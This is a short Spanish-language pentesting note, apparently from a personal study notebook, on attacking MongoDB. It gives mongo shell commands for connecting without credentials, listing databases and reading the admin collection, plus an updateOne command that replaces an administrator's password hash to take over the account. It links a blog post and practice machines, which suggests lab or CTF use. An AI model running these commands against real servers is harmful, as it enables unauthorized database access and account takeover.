
## DESCRIPTION



#### Mas información
* http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html


## EXPLOITATION

Si se permite conectar sin usuario:
```
mongo 192.168.210.110 
show dbs
use admin
db.system.version.find() #ver entradas de la tabla
```

Si no podemos crackear la contraseña podemos intentar cambiarla (por ejemplo si somos capaces de crear un usuario con una contraseña connocida)

```
db.users.updateOne({username: 'administrator'},{$set: {password: '8737729a3ada8674940065008dd87d9bc110221bf02b1048beab6078349e792c'}})

```

![[Pasted image 20230617125744.png]]
## MACHINES

* Hack The Box: 
* PG: Dibbles

